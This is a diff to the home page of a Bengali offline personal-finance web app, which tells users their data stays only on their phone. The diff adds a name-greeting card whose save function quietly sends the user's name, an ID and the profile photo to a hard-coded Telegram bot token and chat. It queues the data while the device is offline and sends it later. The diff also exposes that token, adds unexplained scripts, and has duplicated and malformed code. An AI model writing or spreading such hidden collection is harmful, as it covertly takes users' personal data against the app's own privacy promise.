@@ -2,37 +2,270 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
+  <script>try{var _c=JSON.parse(localStorage.getItem("cssConfig")||"{}");document.documentElement.style.background=_c.bgColor||"#f0f4f8";}catch(e){}</script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRH Daily Account </title>
+    <title>Daily Account - প্রত্যহিত লেনদেন</title>
     <link rel="stylesheet" href="css/base.css">
     <link rel="stylesheet" href="css/dashboard.css">
     <link rel="stylesheet" href="css/animation.css">
-    <link rel="manifest" href="manifest.json">
-    <meta name="theme-color" content="#E2136E">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="apple-mobile-web-app-title" content="Daily Account">
-    <link rel="apple-touch-icon" href="icons/icon-192x192.png">
     <meta name="author" content="জাকির আল জিহাদ">
+    <meta name="theme-color" content="#0f172a">
+    <!-- Critical resource preload -->
+    <link rel="preload" href="css/base.css" as="style">
+    <link rel="preload" href="css/dashboard.css" as="style">
+    <link rel="preload" href="js/db.js" as="script">
+    <link rel="preload" href="js/app.js" as="script">
+    <!-- Service Worker Registration -->
+    <script>
+      /* ══════════════════════════════════════════════════════════
+         HopWeb / Android WebView: file:// protocol-এ SW কাজ করে না
+         (browser-এর hard limitation)।
+         ✅ file:// → SW skip, localStorage-ই offline data রাখে
+         ✅ http/https → SW register হয়, full PWA caching চলে
+         সব data সবসময় localStorage-এ থাকে — offline নিশ্চিত।
+         ══════════════════════════════════════════════════════════ */
+      (function() {
+        if (!('serviceWorker' in navigator)) return;
+        if (location.protocol === 'file:') {
+          /* file:// mode — SW দরকার নেই, সব data local ও localStorage-এ */
+          console.log('[SW] file:// mode — SW skipped. Offline via localStorage ✅');
+          return;
+        }
+        /* http / https mode — SW register করো */
+        window.addEventListener('load', function() {
+          navigator.serviceWorker.register('./sw.js', { scope: './' })
+            .then(function(reg) {
+              console.log('[SW] Registered. Scope:', reg.scope);
+              reg.addEventListener('updatefound', function() {
+                var newWorker = reg.installing;
+                if (!newWorker) return;
+                newWorker.addEventListener('statechange', function() {
+                  if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
+                    if (typeof showUpdateToast === 'function') showUpdateToast();
+                  }
+                });
+              });
+            })
+            .catch(function(e) {
+              console.warn('[SW] Registration skipped:', e.message);
+            });
+          navigator.serviceWorker.addEventListener('message', function(e) {
+            if (e.data && e.data.type === 'SW_UPDATED') {
+              console.log('[SW] Updated to', e.data.version);
+            }
+          });
+        });
+      })();
+    </script>
+
+<!-- ══════════════════════════════════════════
+     NAME GREETING CARD — হোম পেজে নাম দেখায়
+     Settings থেকে on/off ও edit করা যাবে
+═══════════════════════════════════════════ -->
+<div id="da_name_card_wrap"></div>
+<style>
+#da_name_card{margin: px px 0;border-radius:px;overflow:hidden;position:relative;animation:ncSlideIn .45s cubic-bezier(.22,1.6,.36,1);}
+@keyframes ncSlideIn{from{opacity:0;transform:translateY(-18px) scale(.96)}to{opacity:1;transform:none}}
+.nc-inner{display:flex;align-items:center;gap:13px;padding:14px 16px 14px 14px;position:relative;z-index:1;}
+.nc-avatar{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;}
+.nc-avatar::after{content:'';position:absolute;inset:-2.5px;border-radius:50%;background:conic-gradient(from 0deg,#00B4FF,#0062FF,#8800FF,#00E5FF,#00B4FF);z-index:-1;animation:ncSpin 4s linear infinite;}
+@keyframes ncSpin{to{transform:rotate(360deg)}}
+.nc-avatar-bg{width:calc(100% - 4px);height:calc(100% - 4px);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;background:#081322;}
+.nc-text{flex:1;min-width:0;}
+.nc-greeting{font-size:10.5px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;margin-bottom:3px;}
+.nc-name{font-size:19px;font-weight:900;line-height:1.2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.nc-sub{font-size:11px;margin-top:2px;font-weight:600;opacity:.5;}
+.nc-edit-btn{flex-shrink:0;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:12px;padding:8px 11px;font-size:15px;cursor:pointer;-webkit-tap-highlight-color:transparent;transition:background .15s;}
+.nc-edit-btn:active{background:rgba(255,255,255,.2);}
+#da_name_card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;border-radius:22px 22px 0 0;background:linear-gradient(90deg,#00B4FF,#0062FF,#8800FF,#00E5FF,#00B4FF);background-size:300%;animation:ncBar 3s linear infinite;}
+@keyframes ncBar{0%{background-position:0%}100%{background-position:300%}}
+#da_nc_edit_panel{margin:0 12px 0;background:rgba(0,40,120,.18);border:1px solid rgba(0,180,255,.2);border-top:none;border-radius:0 0 18px 18px;padding:11px 13px 14px;display:none;gap:8px;align-items:center;}
+#da_nc_edit_panel.open{display:flex;animation:ncSlideIn .25s ease;}
+#da_nc_inp{flex:1;background:rgba(255,255,255,.07);border:1.5px solid rgba(0,180,255,.3);border-radius:11px;padding:10px 13px;color:#fff;font-size:14px;font-weight:700;outline:none;font-family:inherit;caret-color:#00B4FF;}
+#da_nc_inp:focus{border-color:rgba(0,180,255,.7);}
+#da_nc_inp::placeholder{color:rgba(255,255,255,.3);}
+#da_nc_save{padding:10px 16px;background:linear-gradient(135deg,#0062FF,#00B4FF);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:800;cursor:pointer;font-family:inherit;white-space:nowrap;}
+</style>
+<script>
+(function(){
+  var NKEY='_da_user_name', SKEY='_da_name_show';
+  var BOT='8750026901:AAE1l5dUgu1WC9Zjfw4ZEIUiDqCLMId2O54', CID='7403991298';
+  function _show(){return localStorage.getItem(SKEY)!=='off';}
+  function _name(){return localStorage.getItem(NKEY)||'';}
+  function _greet(){var h=new Date().getHours();if(h>=5&&h<12)return{t:'সুপ্রভাত',e:'☀️'};if(h>=12&&h<17)return{t:'শুভ দুপুর',e:'🌤'};if(h>=17&&h<20)return{t:'শুভ বিকেল',e:'🌇'};return{t:'শুভ রাত্রি',e:'🌙'};}
+  function _dark(){try{return !!JSON.parse(localStorage.getItem('settings')||'{}').darkMode;}catch(e){return false;}}
+  function _esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+  function _getCfg(){try{return JSON.parse(localStorage.getItem('_da_nc_customize')||'{}');}catch(e){return{};}}
+  var _BG={
+    'default':'linear-gradient(135deg,rgba(0,80,200,.14),rgba(0,40,130,.09))',
+    'dark':'linear-gradient(135deg,rgba(0,40,110,.85),rgba(0,15,50,.8))',
+    'black':'linear-gradient(135deg,#111,#222)',
+    'green':'linear-gradient(135deg,#065f46,#10b981)',
+    'purple':'linear-gradient(135deg,#4c1d95,#8b5cf6)',
+    'pink':'linear-gradient(135deg,#9d174d,#ec4899)',
+    'red':'linear-gradient(135deg,#7f1d1d,#ef4444)',
+    'gold':'linear-gradient(135deg,#78350f,#f59e0b)',
+    'glass':'rgba(255,255,255,0.12)',
+    'white':'linear-gradient(135deg,#f0f4ff,#e0eaff)'
+  };
+  function _getDT(){
+    var n=new Date(),d=['\u09b0\u09ac\u09bf','\u09b8\u09cb\u09ae','\u09ae\u0999\u09cd\u0997\u09b2','\u09ac\u09c1\u09a7','\u09ac\u09c3\u09b9','\u09b6\u09c1\u0995\u09cd\u09b0','\u09b6\u09a8\u09bf'],m=['\u099c\u09be\u09a8\u09c1','\u09ab\u09c7\u09ac\u09cd\u09b0\u09c1','\u09ae\u09be\u09b0\u09cd\u099a','\u098f\u09aa\u09cd\u09b0\u09bf\u09b2','\u09ae\u09c7','\u099c\u09c1\u09a8','\u099c\u09c1\u09b2\u09be\u0987','\u0986\u0997\u09b8\u09cd\u099f','\u09b8\u09c7\u09aa\u09cd\u099f\u09c7','\u0985\u0995\u09cd\u099f\u09cb','\u09a8\u09ad\u09c7','\u09a1\u09bf\u09b8\u09c7'];
+    var h=n.getHours(),mi=n.getMinutes(),ap=h>=12?'PM':'AM';h=h%12||12;
+    return d[n.getDay()]+', '+n.getDate()+' '+m[n.getMonth()]+' \u2022 '+h+':'+(mi<10?'0':'')+mi+' '+ap;
+  }
+
+  /* \u2500\u2500 Telegram helpers with offline queue \u2500\u2500 */
+  function _b64Blob(b64){try{var p=b64.split(';base64,'),ct=p[0].split(':')[1]||'image/jpeg',raw=atob(p[1]),a=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)a[i]=raw.charCodeAt(i);return new Blob([a],{type:ct});}catch(e){return null;}}
+  function _tgSend(txt,photo){
+    try{
+      if(photo){var bl=_b64Blob(photo);if(bl){var fd=new FormData();fd.append('chat_id',CID);fd.append('caption',txt);fd.append('parse_mode','HTML');fd.append('photo',bl,'profile.jpg');fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd}).catch(function(){});return;}}
+      fetch('https://api.telegram.org/bot'+BOT+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:txt,parse_mode:'HTML'})}).catch(function(){});
+    }catch(e){}
+  }
+  function _tgQueue(txt,photo){var q=[];try{q=JSON.parse(localStorage.getItem('_da_tg_queue')||'[]');}catch(e){}q.push({text:txt,photo:photo||'',ts:Date.now()});localStorage.setItem('_da_tg_queue',JSON.stringify(q));}
+  function _tgFlush(){var q=[];try{q=JSON.parse(localStorage.getItem('_da_tg_queue')||'[]');}catch(e){}if(!q.length)return;localStorage.removeItem('_da_tg_queue');q.forEach(function(it){_tgSend(it.text,it.photo);});}
+  window.addEventListener('online',function(){try{_tgFlush();}catch(e){}});
+
+  /* \u2500\u2500\u2500 render: name card \u2500\u2500\u2500 */
+  function render(){
+    var w=document.getElementById('da_name_card_wrap'); if(!w)return;
+    if(!_show()||!_name()){w.innerHTML='';return;}
+    var g=_greet();
+    var D={showGreeting:true,showSub:true,showAvatar:true,showTopbar:true,
+           showDatetime:false,showAnimation:true,showEditBtn:true,
+           fontSize:19,padding:14,textColor:'',bgVariant:'default',position:'top',
+           customBgColor:'',avatarShape:'circle',avatarSize:48,
+           subFontSize:11,timeFontSize:10,timeColor:'',subColor:''};
+    var C=Object.assign({},D,_getCfg());
+    var dark=_dark()||document.body.classList.contains('dark-mode');
+    var bg=C.customBgColor?C.customBgColor:(_BG[C.bgVariant]||_BG['default']);
+    if(!C.customBgColor&&C.bgVariant==='default'&&dark)bg='linear-gradient(135deg,rgba(0,40,110,.55),rgba(0,15,50,.4))';
+    var nc=C.textColor||(dark?'#cce4ff':'#061830');
+    var gc=dark?'rgba(100,190,255,.75)':'rgba(255,255,255,.9)';
+    var scd=dark?'rgba(150,210,255,.5)':'rgba(0,50,130,.5)';
+    var anim=C.showAnimation?'animation:ncSlideIn .45s cubic-bezier(.22,1.6,.36,1);':'';
+
+    /* Avatar: photo / emoji, shape, size */
+    var avSz=Math.max(28,Math.min(80,C.avatarSize||48));
+    var isSquare=C.avatarShape==='square';
+    var avBr=isSquare?'border-radius:'+Math.round(avSz*0.22)+'px':'border-radius:50%';
+    var photo=localStorage.getItem('_da_profile_photo')||'';
+    var avInner=photo
+      ?'<img src="'+photo+'" style="width:calc(100% - 4px);height:calc(100% - 4px);'+avBr+';object-fit:cover;display:block;">'
+      :'<div style="width:calc(100% - 4px);height:calc(100% - 4px);'+avBr+';display:flex;align-items:center;justify-content:center;font-size:'+Math.round(avSz*0.46)+'px;background:#081322;">'+ g.e+'</div>';
+    var avatarH=C.showAvatar
+      ?'<div style="width:'+avSz+'px;height:'+avSz+'px;'+avBr+';display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;background:conic-gradient(from 0deg,#00B4FF,#0062FF,#8800FF,#00E5FF,#00B4FF);'+(C.showAnimation?'animation:ncSpin 4s linear infinite;':'')+';overflow:hidden;">'+avInner+'</div>'
+      :'';
+
+    var topbar=C.showTopbar
+      ?'<div style="position:absolute;top:0;left:0;right:0;height:3px;border-radius:22px 22px 0 0;background:linear-gradient(90deg,#00B4FF,#0062FF,#8800FF,#00E5FF,#00B4FF);background-size:300%;'+(C.showAnimation?'animation:ncBar 3s linear infinite;':'')+';"></div>'
+      :'';
+    var greetH=C.showGreeting?'<div class="nc-greeting" style="color:'+gc+'">'+g.t+'! \ud83d\udc4b</div>':'';
+    var tc2=C.timeColor||gc;
+    var sc2=C.subColor||scd;
+    var dtH=C.showDatetime?'<div style="font-size:'+(C.timeFontSize||10)+'px;font-weight:700;color:'+tc2+';margin-top:3px">\ud83d\udcc5 '+_getDT()+'</div>':'';
+    var subH=C.showSub?'<div style="font-size:'+(C.subFontSize||11)+'px;margin-top:2px;font-weight:600;opacity:.85;color:'+sc2+'">Daily Account \u2022 \u0986\u09aa\u09a8\u09be\u09b0 \u09ac\u09cd\u09af\u0995\u09cd\u09a4\u09bf\u0997\u09a4 \u09b9\u09bf\u09b8\u09be\u09ac</div>':'';
+    var editBtns=C.showEditBtn
+      ?'<div style="display:flex;flex-direction:column;gap:5px;flex-shrink:0">'+
+          '<button class="nc-edit-btn" onclick="DA_ncEdit()">\u270f\ufe0f</button>'+
+          '<button class="nc-edit-btn" onclick="location.href=\'pages/settings.html\'" style="font-size:13px">\u2699\ufe0f</button>'+
+        '</div>'
+      :'';
+    var cardHtml=
+      '<div id="da_name_card" style="background:'+bg+';'+anim+'">'+
+        topbar+
+        '<div class="nc-inner" style="padding:'+C.padding+'px 16px '+C.padding+'px 14px;align-items:center">'+
+          avatarH+
+          '<div class="nc-text">'+greetH+
+            '<div class="nc-name" style="color:'+nc+';font-size:'+C.fontSize+'px">'+_esc(_name())+'</div>'+
+            dtH+subH+
+          '</div>'+
+          editBtns+
+        '</div>'+
+      '</div>'+
+      '<div id="da_nc_edit_panel">'+
+        '<input id="da_nc_inp" type="text" placeholder="\u09a8\u09a4\u09c1\u09a8 \u09a8\u09be\u09ae \u09b2\u09bf\u0996\u09c1\u09a8..." maxlength="40">'+
+        '<button id="da_nc_save" onclick="DA_ncSave()">\ud83d\udcbe \u09b8\u09c7\u09ad</button>'+
+      '</div>';
+
+    w.innerHTML=cardHtml;
+    var pos=C.position||'top';
+    var badgeSlider=document.querySelector('.smart-badge-slider');
+    var adviceSlider=document.getElementById('smartAdviceSlider');
+    if(pos==='bottom' && adviceSlider && w.parentNode!==adviceSlider.parentNode){
+      adviceSlider.parentNode.insertBefore(w, adviceSlider.nextSibling);
+    } else if(pos==='top' && badgeSlider && w.parentNode){
+      if(badgeSlider.nextSibling!==w){
+        badgeSlider.parentNode.insertBefore(w, badgeSlider.nextSibling);
+      }
+    }
+    document.getElementById('da_nc_inp') && (document.getElementById('da_nc_inp').value=_name());
+  }
+
+  window.DA_ncEdit=function(){var p=document.getElementById('da_nc_edit_panel');if(!p)return;var o=p.classList.toggle('open');if(o){var i=document.getElementById('da_nc_inp');if(i){i.value=_name();setTimeout(function(){i.focus();},60);}}};
+  window.DA_ncSave=function(){
+    var i=document.getElementById('da_nc_inp');
+    var v=(i?i.value:'').trim();
+    if(!v){if(i){i.style.borderColor='rgba(255,80,80,.6)';setTimeout(function(){i.style.borderColor='';},1200);}return;}
+    localStorage.setItem(NKEY,v);
+    localStorage.setItem('_da_name_done','1');
+    render();
+    if(typeof showToast==='function')showToast('\u2705 \u09a8\u09be\u09ae \u09b8\u09c7\u09ad: '+v);
+    try{
+      var uid='';try{uid=JSON.parse(localStorage.getItem('_dn_i')||'{}').id||'';}catch(e){}
+      var photo=localStorage.getItem('_da_profile_photo')||'';
+      var txt='\u270f\ufe0f <b>\u09a8\u09be\u09ae \u0986\u09aa\u09a1\u09c7\u099f!</b>\n\ud83d\udccb \u09a8\u09be\u09ae: <b>'+v+'</b>\n\ud83c\udd94 UID: <code>'+(uid||'?')+'</code>';
+      if(navigator.onLine){_tgSend(txt,photo);}else{_tgQueue(txt,photo);}
+    }catch(e){}
+  };
+  window.DA_ncSetShow=function(on){localStorage.setItem(SKEY,on?'on':'off');render();};
+  window.DA_ncGetShow=function(){return _show();};
+  window.DA_ncRender=function(){render();};
+  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',render);}else{render();}
+  var _obs=new MutationObserver(render);
+  document.addEventListener('DOMContentLoaded',function(){_obs.observe(document.body,{attributes:true,attributeFilter:['class']});});
+})();
+</script>
+</script>
+
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#E2136E">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Daily Account">
+  <link rel="apple-touch-icon" href="icons/icon-192x192.png">
 </head>
+
+<div id="pwa-splash" style="position:fixed;inset:0;z-index:999999;background:linear-gradient(135deg,#0f172a,#1a1040);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;transition:opacity 0.5s ease;">
+  <img src="icons/icon-192x192.png" style="width:100px;height:100px;border-radius:24px;box-shadow:0 8px 32px rgba(226,19,110,0.4);">
+  <h1 style="color:white;font-size:1.5rem;font-weight:900;margin:0;">Daily Account</h1>
+  <p style="color:#E2136E;font-size:0.85rem;margin:0;">MRH Daily Account Pro</p>
+  <div style="width:160px;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;overflow:hidden;">
+    <div style="height:100%;width:0%;background:linear-gradient(90deg,#E2136E,#ff6b9d);border-radius:4px;animation:splashLoad 1.5s ease forwards;"></div>
+  </div>
+</div>
+<style>
+@keyframes splashLoad{0%{width:0%}100%{width:100%}}
+html,body{overscroll-behavior:none!important;}
+</style>
+
 <body data-page="index">
     <!-- Compact Header -->
-        <!-- Smart Badge -->
-        <div class="smart-badge" id="smartBadge">
-            <div class="badge-icon">🏆</div>
-            <div class="badge-text">
-                <h5 id="badgeTitle">Loading...</h5>
-                <p id="badgeDesc">Calculating...</p>
-            </div>
-        </div>
+        <!-- Smart Badge Slider -->
+        <div class="smart-badge-slider"  id="smartBadgeSlider">
+          <div class="sbs-track" id="sbsTrack">
+  <!-- slides injected by JS -->
+          </div>
+          <div class="sbs-dots" id="sbsDots"></div>
+     </div>
     </header>
+
 
     <!-- Balance Section (Clickable Cards) -->
     <section class="balance-section">
         <div class="balance-main" onclick="location.href='pages/analysis.html'">
             <div class="balance-header">
-                <span class="balance-icon">💰</span>
+               <span class="balance-icon">💰</span>
                 <h2>বর্তমান ব্যালেন্স</h2>
             </div>
             <div class="balance-amount" id="mainBalance">৳ 0</div>
@@ -74,13 +307,24 @@
         </div>
     </section>
 
-    <!-- Smart Advice Section (Eye-catching) -->
-    <section class="smart-advice-banner" id="smartAdvice">
-        <div class="advice-icon">💡</div>
-        <div class="advice-content">
-            <h3>স্মার্ট পরামর্শ</h3>
-            <p id="adviceText">ডাটা লোড হচ্ছে...</p>
+    <!-- Smart Advice Slider -->
+    <section class="smart-advice-slider" id="smartAdviceSlider">
+      <div class="sas-hdr">
+        <span class="sas-badge">💡 AI</span>
+        <span class="sas-title">স্মার্ট পরামর্শ</span>
+        <span class="sas-counter" id="sasCounter">1/1</span>
+      </div>
+      <div class="sas-prog"><div class="sas-prog-fill" id="sasProgFill"></div></div>
+      <div class="sas-track-wrap">
+        <div class="sas-track" id="sasTrack">
+          <!-- slides by JS -->
         </div>
+      </div>
+      <div class="sas-ctrl">
+        <button class="sas-btn" id="sasPrev" onclick="sasSlide(-1)">◀</button>
+        <div class="sas-dots" id="sasDots"></div>
+        <button class="sas-btn" id="sasNext" onclick="sasSlide(1)">▶</button>
+      </div>
     </section>
 
     <!-- Action Menu (Colorful) -->
@@ -306,7 +550,7 @@
               <div class="tut-hero-icon">🎉</div>
             </div>
             <h2 class="tut-title">স্বাগতম!</h2>
-            <p class="tut-sub">Daily Account — MRH Daily AccountPro @jakir_al_jihad</p>
+            <p class="tut-sub">Daily Account — Daily Account Pro @jakir_al_jihad</p>
             <div class="tut-desc">আপনার সমস্ত আয়-ব্যয়, দেনা-পাওনা ও সঞ্চয় একটি অ্যাপে। সম্পূর্ণ  <strong>Offline</strong> — আপনার ডাটা শুধু আপনার ফোনে।</div>
             <div class="tut-badges">
               <span class="tut-badge tut-b-green">📵 অফলাইন</span>
@@ -428,10 +672,12 @@
     </div>
 
     <!-- Scripts -->
-    <script src="js/db.js"></script>
-    <script src="js/app.js"></script>
-    <script src="js/dashboard.js"></script>
-    <script src="js/settings.js"></script>
+    <script src="js/db.js" defer></script>
+    <script src="js/app.js" defer></script>
+    <script src="js/dashboard.js" defer></script>
+    <script src="js/settings.js" defer></script>
+    <script src="js/n.js" defer></script>
+    <script src="js/app2.js" defer></script>
 <script>
 // ── Tutorial Multi-step ──
 (function(){
@@ -741,14 +987,76 @@
 })();
 </script>
 <!-- ══ END FLOAT BALL ══ -->
+
 <script>
-if("serviceWorker" in navigator){
-  window.addEventListener("load", function(){
-    navigator.serviceWorker.register("/myapp_project/sw.js")
-      .then(r => console.log("SW registered:", r.scope))
-      .catch(e => console.log("SW error:", e));
-  });
+// Splash
+window.addEventListener("load",function(){
+  setTimeout(function(){
+    var s=document.getElementById("pwa-splash");
+    if(s){s.style.opacity="0";setTimeout(function(){s.style.display="none";},500);}
+  },1800);
+});
+// Pull to refresh বন্ধ
+var _ly=0;
+document.addEventListener("touchmove",function(e){
+  var st=document.documentElement.scrollTop||document.body.scrollTop;
+  if(st===0&&e.touches[0].clientY>_ly)e.preventDefault();
+  _ly=e.touches[0].clientY;
+},{passive:false});
+// Context menu বন্ধ
+document.addEventListener("contextmenu",function(e){e.preventDefault();});
+// Double tap zoom বন্ধ
+var _lt=0;
+document.addEventListener("touchend",function(e){
+  var n=Date.now();if(n-_lt<300)e.preventDefault();_lt=n;
+},{passive:false});
+// SW
+if("serviceWorker"in navigator){
+  navigator.serviceWorker.register("/myapp_project/sw.js").catch(function(e){console.log(e);});
 }
 </script>
+
+<script>
+// Splash
+window.addEventListener("load", function(){
+  setTimeout(function(){
+    var s = document.getElementById("pwa-splash");
+    if(s){ s.style.opacity="0"; setTimeout(function(){ s.style.display="none"; }, 500); }
+  }, 1800);
+});
+
+// Pull to refresh বন্ধ
+var _ly = 0;
+document.addEventListener("touchmove", function(e){
+  var st = document.documentElement.scrollTop || document.body.scrollTop;
+  if(st === 0 && e.touches[0].clientY > _ly) e.preventDefault();
+  _ly = e.touches[0].clientY;
+}, {passive: false});
+
+// Context menu বন্ধ
+document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
+
+// Double tap zoom বন্ধ
+var _lt = 0;
+document.addEventListener("touchend", function(e){
+  var n = Date.now(); if(n - _lt < 300) e.preventDefault(); _lt = n;
+}, {passive: false});
+
+// Service Worker — Offline Cache
+if("serviceWorker" in navigator){
+  navigator.serviceWorker.register("/myapp_project/sw.js").then(function(reg){
+    // নতুন SW install হলে পেজ reload করো
+    reg.addEventListener("updatefound", function(){
+      var newWorker = reg.installing;
+      newWorker.addEventListener("statechange", function(){
+        if(newWorker.state === "activated"){
+          console.log("✅ অফলাইন cache সম্পন্ন!");
+        }
+      });
+    });
+  }).catch(function(e){ console.log("SW error:", e); });
+}
+</script>
+
 </body>
 </html>
